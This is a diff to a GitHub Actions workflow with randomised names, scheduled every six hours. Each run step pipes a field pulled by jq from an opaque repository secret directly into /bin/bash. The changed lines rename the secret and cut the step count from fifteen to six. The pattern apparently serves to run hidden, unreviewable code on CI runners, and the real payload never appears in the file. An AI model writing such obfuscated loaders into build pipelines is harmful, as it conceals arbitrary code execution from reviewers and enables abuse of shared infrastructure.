@@ -1,10 +1,10 @@
 name: ourselvessuffix
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 1/6 * * *'
-
-jobs:  # 21877
+    - cron: '34 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,21 +12,12 @@ jobs:  # 21877
       - uses: actions/checkout@v4
       - name: ourselvessuffix
         env:
-          jacn9: ${{ secrets.jacn9 }}
+          qjiv86: ${{ secrets.qjiv86 }}
         run: |
-          echo $jacn9 | jq -r .rgdlj34 | /bin/bash
-          echo $bn1098 | jq -r .fp097 | /bin/bash
-          echo $bxd0526 | jq -r .s57122 | /bin/bash
-          echo $nd017 | jq -r .zdgc5517 | /bin/bash
-          echo $e01 | jq -r .cx8 | /bin/bash
-          echo $yxvwq952 | jq -r .mjya42883 | /bin/bash
-          echo $j7721 | jq -r .vok12633 | /bin/bash
-          echo $pl93459 | jq -r .rz170 | /bin/bash
-          echo $derkv810 | jq -r .wt09 | /bin/bash
-          echo $frc940 | jq -r .nueq61 | /bin/bash
-          echo $zqjn02386 | jq -r .pga875 | /bin/bash
-          echo $nbith19 | jq -r .b972 | /bin/bash
-          echo $ad37711 | jq -r .qxc2 | /bin/bash
-          echo $um1 | jq -r .scunj6 | /bin/bash
-          echo $ezbyl70680 | jq -r .s96039 | /bin/bash
+          echo $qjiv86 | jq -r .emuo09 | /bin/bash
+          echo $wp06500 | jq -r .ksw071 | /bin/bash
+          echo $doss9 | jq -r .ce2966 | /bin/bash
+          echo $t12755 | jq -r .oxkm04 | /bin/bash
+          echo $ql31 | jq -r .utq097 | /bin/bash
+          echo $ewt73 | jq -r .ktzuh00 | /bin/bash
 
